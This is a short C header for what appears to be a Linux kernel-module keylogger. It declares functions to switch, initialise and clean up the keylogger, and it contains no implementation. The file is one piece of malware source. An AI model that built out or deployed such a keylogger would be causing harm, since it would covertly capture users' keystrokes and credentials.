#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/kernel.h>
#include <linux/module.h>

int switch_keylogger( char * path, char kill );
void init_keylogger( void );
void clean_keylogger( void );
#endif